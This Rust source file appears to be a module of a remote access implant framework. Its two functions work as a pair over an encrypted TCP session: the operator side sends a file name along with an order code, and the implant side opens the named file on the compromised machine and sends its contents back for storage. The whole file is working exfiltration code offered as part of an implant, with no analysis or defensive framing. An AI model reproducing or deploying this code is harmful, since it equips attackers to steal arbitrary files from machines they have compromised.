use std::fs::File;
use std::io::{ Read, Write };
use std::{ io, str };
use communication::*;
use byteorder::{ByteOrder, LittleEndian};

pub fn client_run(storage_file: &mut File, implant_session: &mut encrypted_tcp::EncryptedSession, file_name: &str) -> Result<(), io::Error> {
    LittleEndian::write_u32(&mut implant_session.tcp_session.orders, 1002);
    implant_session.send_orders();
    implant_session.tcp_session.output_buffer.write(&file_name.as_bytes()).unwrap();
    implant_session.send(); //Send the name of the file to retrieve
    match implant_session.get_orders() {
        9999 => {
            implant_session.recv();
            storage_file.write(&implant_session.tcp_session.input_buffer).unwrap();
            try!(storage_file.sync_all());
        },
        9998 => {implant_session.recv();
            io::stdout().write(str::from_utf8(&implant_session.tcp_session.input_buffer).unwrap().as_bytes())
                .unwrap();
            io::stdout().flush().unwrap();
        },
        _ => panic!("Failed trying to retrieve file"),
    }
    Ok(())
}

pub fn server_run(implant_session: &mut encrypted_tcp::EncryptedSession) -> Result<(), io::Error> {
    implant_session.recv(); //Receive name of file to send
    let mut remote_file = try!(File::open(str::from_utf8(&implant_session.tcp_session.input_buffer).unwrap()));
    let metadata = try!(remote_file.metadata());
    if metadata.is_file() == false {
        LittleEndian::write_u32(&mut implant_session.tcp_session.orders, 9998);
        implant_session.send_orders();
        implant_session.tcp_session.output_buffer.append(&mut "Requested file is not a regular file.".to_owned().into_bytes());
        implant_session.tcp_session.output_buffer.append(&mut "\n".to_owned().into_bytes());
        return Ok(())
    }
    LittleEndian::write_u32(&mut implant_session.tcp_session.orders, 9999);
    implant_session.send_orders();
    remote_file.read_to_end(&mut implant_session.tcp_session.output_buffer).unwrap();
    Ok(())
}
